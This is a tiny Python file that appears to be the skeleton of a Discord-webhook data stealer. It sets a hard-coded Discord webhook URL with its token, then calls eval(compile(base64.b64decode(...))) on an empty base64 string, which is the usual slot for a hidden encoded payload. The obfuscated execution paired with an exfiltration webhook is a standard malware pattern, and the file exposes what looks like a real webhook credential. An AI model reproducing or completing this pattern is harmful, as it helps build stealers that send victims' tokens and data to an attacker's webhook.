import base64, codecs

#WEBHOOK URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1054102989721313311/_oXOFzejbOqsb8Q5-LMIqmStS7iRJNwuoi88pH8DhlDXnm-n1rIv4mHFqXdlm8G6phwE'

eval(compile(base64.b64decode(""), "<string>", 'exec'))
#all

